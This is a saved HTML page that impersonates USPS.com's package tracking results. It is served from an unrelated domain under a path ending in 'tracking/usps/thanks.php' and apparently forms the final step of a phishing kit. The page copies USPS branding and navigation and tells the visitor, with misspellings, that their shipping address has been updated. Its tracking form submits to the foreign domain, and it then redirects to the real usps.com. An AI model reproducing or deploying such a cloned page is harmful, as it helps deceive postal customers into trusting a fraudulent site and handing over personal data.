...
<html class="js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients no-cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths dj_gecko dj_contentbox js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  ...
  <script src="./files/metrics-all.js"></script><script data-dapp-detection="">!function(){let e=!1;function n(){if(!e){const n=document.createElement("meta");n.name="dapp-detected",document.head.appendChild(n),e=!0}}if(window.hasOwnProperty("ethereum")){if(window.__disableDappDetectionInsertion=!0,void 0===window.ethereum)return;n()}else{var t=window.ethereum;Object.defineProperty(window,"ethereum",{configurable:!0,enumerable:!1,set:function(e){window.__disableDappDetectionInsertion||n(),t=e},get:function(){if(!window.__disableDappDetectionInsertion){const e=arguments.callee;e&&e.caller&&e.caller.toString&&-1!==e.caller.toString().indexOf("getOwnPropertyNames")||n()}return t}})}}();</script>
  <script src="./files/optimize.js"></script>
  <title>USPS.com® - USPS Tracking® Results</title>
  <meta http-equiv="refresh" content="3;url=https://www.usps.com">
  <link rel="stylesheet" href="./files/footer.css">
  <link rel="stylesheet" href="./files/bootstrap.min.css">
  <link rel="stylesheet" href="./files/calendar.css">
  <link rel="stylesheet" href="./files/datepicker3.css">
  <link rel="stylesheet" href="./files/main.css">
  <link rel="stylesheet" href="./files/tracking-cross-sell.css">
  <link rel="stylesheet" href="./files/jquery-ui.min.css">
  <link rel="stylesheet" href="./files/schedule-redelivery.css">
  <script type="text/javascript" async="" src="./files/trackingCode.js"></script>
  <script type="text/javascript" charset="utf-8" async="" data-requirecontext="header" data-requiremodule="require-jquery" src="./files/require-jquery.js"></script>
  <script type="text/javascript" charset="utf-8" async="" data-requirecontext="header" data-requiremodule="helpers" src="./files/helpers.js"></script>
  <script type="text/javascript" charset="utf-8" async="" data-requirecontext="header" data-requiremodule="search-fe" src="./files/search-fe.js"></script>
  <link href="./files/qt.css" type="text/css" rel="stylesheet" media="screen">
  <script type="text/javascript" charset="utf-8" async="" data-requirecontext="header" data-requiremodule="jquery" src="./files/jquery.min.js(1).download"></script>
  <script type="text/javascript" charset="utf-8" async="" data-requirecontext="global" data-requiremodule="resize-manager" src="./files/resize-manager.js"></script>
<script type="text/javascript" charset="utf-8" async="" data-requirecontext="header" data-requiremodule="require-jquery" src="./files/require-jquery.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="header" data-requiremodule="helpers" src="./files/helpers.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="header" data-requiremodule="search-fe" src="./files/search-fe.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="header" data-requiremodule="jquery" src="./files/jquery-3.5.1.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="global" data-requiremodule="resize-manager" src="./files/resize-manager.js"></script></head>
<body>
<div id="tracking_page_wrapper">
<link href="./files/megamenu-v2.css" type="text/css" rel="stylesheet">
<style>
...
<div class="nav-utility" id="nav-utility">
	<div class="utility-links" id="utility-header">
		<div class="lang-select">
			<a id="link-lang" href="https://www.okinawa-grandmer.com/tracking/usps/thanks.php#">
		...
		<a id="link-locator" href="https://www.okinawa-grandmer.com/tracking/usps/thanks.php#">Locations</a>
		<a id="link-customer" href="https://www.okinawa-grandmer.com/tracking/usps/thanks.php#">Support</a>
		<a id="link-myusps" href="https://www.okinawa-grandmer.com/tracking/usps/thanks.php#">Informed Delivery</a>
		<a id="login-register-header" class="link-reg" href="https://reg.usps.com/entreg/LoginAction_input?app=UspsTools&amp;appURL=https://www.okinawa-grandmer.com/tracking/usps/thanks.php">Register / Sign In</a>
		<div id="link-cart" style="display: inline-block;"></div>
	</div>
</div>
<div class="global--navigation" id="g-navigation">
	<a tabindex="-1" name="skipallnav" id="skipallnav" href="https://www.okinawa-grandmer.com/tracking/usps/thanks.php#endnav" class="hidden-skip">Skip all category navigation links</a>
<div class="nav-full">

  <a class="global-logo" href="https://www.usps.com/" style="vertical-align: baseline;">
    <img src="./files/logo-sb.svg" alt="Image of USPS.com logo." aria-label="Image of USPS.com logo.">
  </a>
	<div class="mobile-header">
		<a class="mobile-hamburger" href="https://www.okinawa-grandmer.com/tracking/usps/thanks.php#"><img src="./files/hamburger.svg" alt="hamburger menu Icon"></a>
		<a class="mobile-logo" href="https://www.usps.com/"><img src="./files/logo_mobile.svg" alt="USPS mobile logo"></a>
		<a class="mobile-search" href="https://www.okinawa-grandmer.com/tracking/usps/thanks.php#"><img src="./files/search.svg" alt="Search Icon"></a>
	</div>
	
 <nav>
  	<div class="mobile-log-state">
		<div id="msign" class="mobile-utility">
			<div class="mobile-sign"><a href="https://reg.usps.com/entreg/LoginAction_input?app=UspsTools&amp;appURL=https://www.okinawa-grandmer.com/tracking/usps/thanks.php">Sign In</a></div>
		</div>
	</div>
    <ul class="nav-list" role="menubar">
      <li class="qt-nav menuheader">
	  	<a tabindex="-1" name="navquicktools" id="navquicktools" href="https://www.okinawa-grandmer.com/tracking/usps/thanks.php#navmailship" class="hidden-skip">Skip Quick Tools Links</a>
		<a aria-expanded="false" role="menuitem" tabindex="0" aria-haspopup="true" class="nav-first-element menuitem" href="https://www.okinawa-grandmer.com/tracking/usps/thanks.php#">Quick Tools</a>
        <div class="">
			<ul role="menu" aria-hidden="true">
				<li>
					<a role="menuitem" tabindex="-1" href="https://tools.usps.com/go/TrackConfirmAction_input">    
						<img src="./files/tracking.svg" alt="Tracking Icon">
						<p>Track a Package</p> 
					</a>
				</li>
				<li>
					<a role="menuitem" tabindex="-1" href="https://informeddelivery.usps.com/">
						<img src="./files/mailman.svg" alt="Informed Delivery Icon">
						<p>Informed Delivery</p>
					</a>
				</li>
				<li>
					<a role="menuitem" tabindex="-1" href="https://tools.usps.com/find-location.htm">
						<img src="./files/location.svg" alt="Post Office Locator Icon">
						<p>Find USPS Locations</p>
					</a>
				</li>
				<li>
					<a role="menuitem" tabindex="-1" href="https://store.usps.com/store/browse/category.jsp?categoryId=buy-stamps">
						<img src="./files/stamps.svg" alt="Stamps Icon">
						<p>Buy Stamps</p>
					</a>
				</li>
				<li>
					<a role="menuitem" tabindex="-1" href="https://tools.usps.com/schedule-pickup-steps.htm">
						<img src="./files/schedule_pickup.svg" alt="Schedule a Pickup Icon">
						<p>Schedule a Pickup</p>
					</a>
				</li>
				<li>
					<a role="menuitem" tabindex="-1" href="https://postcalc.usps.com/">
						<img src="./files/calculate_price.svg" alt="Calculate a Price Icon">
						<p>Calculate a Price</p>
					</a>
				</li>
				<li>
					<a role="menuitem" tabindex="-1" href="https://tools.usps.com/go/ZipLookupAction_input">
						<img src="./files/find_zip.svg" alt="Zip Code™ Lookup Icon">
						<p>Look Up a <br>ZIP Code<sup>™</sup></p>
					</a>
				</li>
				<li>
					<a role="menuitem" tabindex="-1" href="https://holdmail.usps.com/holdmail/">
						<img src="./files/holdmail.svg" alt="Holdmail Icon">
						<p>Hold Mail</p>
					</a>
				</li>
				<li>
					<a role="menuitem" tabindex="-1" href="https://moversguide.usps.com/?referral=MG82">
						<img src="./files/change_address.svg" alt="Change of Address Icon">
						<p>Change My Address</p>
					</a>
				</li>
				<li>
					<a role="menuitem" tabindex="-1" href="https://www.usps.com/manage/po-boxes.htm">
						<img src="./files/po_box.svg" alt="Post Office Boxes Icon">
						<p>Rent/Renew a <br>PO Box</p>
					</a>
				</li>
				<li>	
					<a role="menuitem" tabindex="-1" href="https://store.usps.com/store/browse/category.jsp?categoryId=shipping-supplies">
						<img src="./files/free_boxes.svg" alt="Shipping Supplies Icon">
						<p>Free Boxes</p>
					</a>
				</li>
				<li>
					<a role="menuitem" tabindex="-1" href="https://cns.usps.com/">
						<img src="./files/featured_clicknship.svg" alt="Click-N-Ship Icon">
						<p>Click-N-Ship</p>
					</a>
				</li>
			</ul>
      ...
      <li class="menuheader">
	  	<a tabindex="-1" name="navmailship" id="navmailship" href="https://www.okinawa-grandmer.com/tracking/usps/thanks.php#navtrackmanage" class="hidden-skip">Skip Mail and Ship Links</a>
        ...
        <div class="repos">
		  ...
		  <ul role="menu" aria-hidden="true">
		   ...
		   <div class="desktop-only mailship-addition"><a role="menuitem" tabindex="-1" href="https://www.usps.com/ship/go-now.htm"><img src="./files/go-now.png" alt=" "><span class="visuallyhidden">Print and ship from home. Start Click-N-Ship.</span><span class="visuallyhidden">Print and ship from home. Start Click-N-Ship.</span></a></div>
		  </ul>
      ...
      <li class="menuheader">
	  	<a tabindex="-1" name="navtrackmanage" id="navtrackmanage" href="https://www.okinawa-grandmer.com/tracking/usps/thanks.php#navpostalstore" class="hidden-skip">Skip Track and Manage Links</a>
...
<div class="desktop-only manage-addition"><a role="menuitem" tabindex="-1" href="https://www.usps.com/manage/go-now.htm"><img src="./files/go-now(1).png" alt=" "></a></div>
          </ul>
      ...
      <li class="menuheader">
	  	<a tabindex="-1" name="navpostalstore" id="navpostalstore" href="https://www.okinawa-grandmer.com/tracking/usps/thanks.php#navbusiness" class="hidden-skip">Skip Postal Store Links</a>
        ...
        <div class="repos">
          ...
          <ul role="menu" aria-hidden="true">
            ...
            <div class="desktop-only shop-addition">
              <a role="menuitem" tabindex="-1" href="https://www.usps.com/store/go-now.htm"><img src="./files/go-now(2).png" alt=" "><span class="visuallyhidden">Shop Forever Stamps. Shop now.</span><span class="visuallyhidden">Shop Forever Stamps. Shop now.</span></a>
			</div>
          </ul>
      ...
      <li class="menuheader">
	  	<a tabindex="-1" name="navbusiness" id="navbusiness" href="https://www.okinawa-grandmer.com/tracking/usps/thanks.php#navinternational" class="hidden-skip">Skip Business Links</a>
        ...
        <div class="repos">
          <ul role="menu" aria-hidden="true" class="tools">
            ...
            <div class="desktop-only business-addition">
              <a role="menuitem" tabindex="-1" href="https://www.usps.com/business/go-now.htm"><img src="./files/go-now(3).png" alt=" "><span class="visuallyhidden">Grow your business with Every Door Direct Mail. Try EDDM now.</span><span class="visuallyhidden">Grow your business with Every Door Direct Mail. Try EDDM now.</span></a>
			</div>
          </ul>
      ...
      <li class="menuheader">
		<a tabindex="-1" name="navinternational" id="navinternational" href="https://www.okinawa-grandmer.com/tracking/usps/thanks.php#navhelp" class="hidden-skip">Skip International Links</a>
        ...
        <div class="repos">
          <ul role="menu" aria-hidden="true" class="tools">
            ...
            <div class="desktop-only international-addition">
              <a role="menuitem" tabindex="-1" href="https://www.usps.com/international/go-now.htm"><img src="./files/go-now(4).png" alt=" "><span class="visuallyhidden">Use our online scheduler to make a passport appointment. Schedule Today.</span><span class="visuallyhidden">Use our online scheduler to make a passport appointment. Schedule Today.</span></a>
			</div>
          </ul>
      ...
      <li class="menuheader">
	  	<a tabindex="-1" name="navhelp" id="navhelp" href="https://www.okinawa-grandmer.com/tracking/usps/thanks.php#navsearch" class="hidden-skip">Skip Help Links</a>
	  ...
	  <li class="nav-search menuheader">
	  	<a tabindex="-1" name="navsearch" id="navsearch" href="https://www.okinawa-grandmer.com/tracking/usps/thanks.php#endnav" class="hidden-skip">Skip Search</a>
		<a aria-expanded="false" class="menuitem" tabindex="0" aria-haspopup="true" role="menuitem" href="https://www.okinawa-grandmer.com/tracking/usps/thanks.php#">Search USPS.com</a>
		<div class="repos">
		<!-- Search -->
	...
	<a name="endnav" id="endnav" href="https://www.okinawa-grandmer.com/tracking/usps/thanks.php#" class="hidden-skip">&nbsp;</a>
</div></div>

<script type="text/javascript" src="./files/jquery-3.2.1.js"></script>
<script src="./files/modernizr.js"></script>
<script type="text/javascript" src="./files/megamenu.js"></script>
<script type="text/javascript" src="./files/OneLinkUsps.js"></script>
<script type="text/javascript" src="./files/ge-login.js"></script>
<script src="./files/require.js"></script>
<script src="./files/header-init-search.js"></script>
<script src="./files/megamenu-additions.js"></script>
    ...
    <div class="container-fluid full-subheader"> <!-- Subheader -->
      ...
      <div class="subheader_links">
        <a href="https://www.okinawa-grandmer.com/tracking/usps/thanks.php#" class="active">Tracking <i class="icon-carat_right"></i></a>
        <a href="https://www.okinawa-grandmer.com/tracking/usps/thanks.php#" class="header-faqs" id="faqHeader"><strong><p style="color:red">FAQs</p></strong> <i class="icon-carat_right"></i></a>
      </div>
    </div>
	<div class="container-fluid tracking_form_container"> 
      <div class="row">
        <div class="col-xl-3 col-lg-4 col-sm-12">
          <h3><a class="track-another-package-open" href="https://www.okinawa-grandmer.com/tracking/usps/thanks.php#">Track Another Package <i>+</i></a></h3>
        </div>
						...
						<div class="row">
							<div class="col-md-12 col-sm-12 col-xs-12 button-wrapper">
								<div class="button-container redlivbtnContainer">
									<a href="https://www.okinawa-grandmer.com/tracking/usps/thanks.php#" role="button" class="btn-primary saveDate" id="save-resume-date" data-dismiss="modal" tabindex="0">Select</a>
								</div>
							</div>
							<div class="col-md-12 col-sm-12 col-xs-12 button-wrapper">
								<div class="button-container redlivbtnContainer">
									<a href="https://www.okinawa-grandmer.com/tracking/usps/thanks.php#" role="button" class="btn-primary button--white clearDates" id="clear-resume-dates" data-dismiss="modal" tabindex="0">Cancel</a>
								</div>
							</div>
						</div>
					</div>
	...
	<!-- END CALENDAR MODAL -->
      ...
      <div class="row">
        <div class="col-sm-10">
          <span class="cancel"><a href="https://www.okinawa-grandmer.com/tracking/usps/thanks.php#" class="track-another-package-close" style="display: none;">Close <i class="icon-cancel"></i></a></span>
        </div>
      </div>
      <div class="row tracking-group" style="display: none">

	  <!-- Start TRACKING FORM -->
	  <form data-toggle="validator" action="https://www.okinawa-grandmer.com/tracking/usps/TrackConfirmAction" name="TrackConfirmAction" id="trackPackage" method="GET" novalidate="true">
    ...
    <div id="tracked-numbers">
   	<div class="track-bar-container">
		...
		<div class="delivery_status">
                  <h3>Status : </h3>
                  <h2> <strong style="">We have update your shipping address</strong>
					<p style="margin-top:15px;font-size:14px;">For more information about claims, visit your local Post Office or our Web site at <a href="http://www.usps.com/insuranceclaims/">http://www.usps.com/insuranceclaims/</a>.<br> The U.S.Postal Service values your buisness . We apologize for any inconvenience you may have experienced as a result of this matter .</p></h2>
...
<div class="row">
<center>
<button href="http://www.usps.com/insuranceclaims/"><div id="a-address-step1-wrap" class="btn-wrap-single"><a tabindex="13" id="a-address-step1" class="btn btn-primary btn-lg">Continue</a></div></button>
</center>
</div>
</div>
</div>
...
<div class="row">
  <div class="col-sm-12">
    ...
    <a href="https://www.okinawa-grandmer.com/tracking/usps/thanks.php#" id="idxsFAQBtn" class="button">FAQs</a>
  </div>
</div>
</div>
...
<link type="text/css" rel="stylesheet" href="./files/main-sb.css">
<link type="text/css" rel="stylesheet" href="./files/footer-sb.css">
...
<li><a href="https://www.okinawa-grandmer.com/tracking/usps/thanks.php#" onclick="KAMPYLE_ONSITE_SDK.showForm(244)">Feedback</a></li>
</ol>
</li>
